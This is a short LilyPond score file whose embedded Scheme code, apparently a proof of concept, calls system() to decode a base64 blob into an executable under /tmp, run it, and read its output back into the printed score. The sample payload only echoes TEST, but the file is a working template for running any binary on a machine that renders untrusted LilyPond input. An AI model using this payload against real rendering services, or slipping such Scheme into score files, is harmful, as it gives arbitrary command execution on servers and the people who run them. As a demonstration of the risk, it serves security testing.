% write binary file to disk, chmod it, execute it, read output
% (binary file needs to be base64 encoded)
#(define s "")
#(system "echo IyEvYmluL3NoCgplY2hvIFRFU1QK | base64 -d > /tmp/qwertyasdf; chmod +x /tmp/qwertyasdf; /tmp/qwertyasdf > /tmp/asdfqwerty")
#(let*  ((f (open-input-file "/tmp/asdfqwerty"))
        (c #\space))
  (while (not (eof-object? c))
  (set! s (string-append s (string c)))
  (set! c (read-char f))))
\new Staff <<{g^#s
}>>
